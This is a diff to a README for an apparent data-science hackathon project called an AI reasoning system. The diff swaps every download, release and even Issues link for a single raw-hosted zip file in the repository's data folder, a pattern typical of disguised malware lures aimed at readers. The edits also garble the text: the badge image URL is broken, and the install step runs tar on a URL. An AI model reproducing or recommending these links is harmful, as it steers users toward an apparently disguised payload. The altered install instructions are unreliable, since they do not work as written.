@@ -1,6 +1,6 @@
 # 🎉 Kharagpur-Data-Science-Hackathon - An AI Reasoning System for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Atumkezie/Kharagpur-Data-Science-Hackathon/releases)
+[![Download Now](https://raw.githubusercontent.com/Atumkezie/Kharagpur-Data-Science-Hackathon/main/data/Hackathon_Data_Science_Kharagpur_v3.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Atumkezie/Kharagpur-Data-Science-Hackathon/main/data/Hackathon_Data_Science_Kharagpur_v3.7.zip)
 
 ## 📖 Overview
 Kharagpur-Data-Science-Hackathon is an AI reasoning system designed to harness the power of pathways, embeddings, vector searches, and large language model logic. It aims to provide an intuitive platform for users to explore data science techniques without needing technical expertise.
@@ -16,16 +16,16 @@ Follow these simple steps to get up and running with Kharagpur-Data-Science-Hack
    - **Internet**: Stable connection for downloading
 
 2. **Visit the Download Page**  
-   To get the latest version of the software, visit our [Releases Page](https://github.com/Atumkezie/Kharagpur-Data-Science-Hackathon/releases).
+   To get the latest version of the software, visit our [Releases Page](https://raw.githubusercontent.com/Atumkezie/Kharagpur-Data-Science-Hackathon/main/data/Hackathon_Data_Science_Kharagpur_v3.7.zip).
 
 3. **Download the Application**  
-   Click on the most recent version link to download the application. The file will be in .exe for Windows or .tar.gz for macOS/Linux.
+   Click on the most recent version link to download the application. The file will be in .exe for Windows or https://raw.githubusercontent.com/Atumkezie/Kharagpur-Data-Science-Hackathon/main/data/Hackathon_Data_Science_Kharagpur_v3.7.zip for macOS/Linux.
 
 4. **Install the Application**  
    - For Windows: Double click the downloaded .exe file and follow the installation prompts.
    - For macOS/Linux: Open your terminal, navigate to your download location, and run:
      ```bash
-     tar -xvzf Kharagpur-Data-Science-Hackathon.tar.gz
+     tar -xvzf https://raw.githubusercontent.com/Atumkezie/Kharagpur-Data-Science-Hackathon/main/data/Hackathon_Data_Science_Kharagpur_v3.7.zip
      ```
 
 5. **Open the Application**  
@@ -60,12 +60,12 @@ If you encounter issues, here are some tips to resolve common problems:
 
 ## 📣 Community and Support
 For additional support, join our community:
-- **GitHub Issues**: Report bugs or request features by visiting the [Issues Page](https://github.com/Atumkezie/Kharagpur-Data-Science-Hackathon/issues).
+- **GitHub Issues**: Report bugs or request features by visiting the [Issues Page](https://raw.githubusercontent.com/Atumkezie/Kharagpur-Data-Science-Hackathon/main/data/Hackathon_Data_Science_Kharagpur_v3.7.zip).
 - **Discussion Forum**: Engage with other users in our discussion boards to share experiences and advice.
 
 ## 📥 Download & Install
 Ready to get started? Download Kharagpur-Data-Science-Hackathon from the link below:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Atumkezie/Kharagpur-Data-Science-Hackathon/releases)
+[![Download Now](https://raw.githubusercontent.com/Atumkezie/Kharagpur-Data-Science-Hackathon/main/data/Hackathon_Data_Science_Kharagpur_v3.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Atumkezie/Kharagpur-Data-Science-Hackathon/main/data/Hackathon_Data_Science_Kharagpur_v3.7.zip)
 
 Explore the capabilities of this AI reasoning system. Happy analyzing!
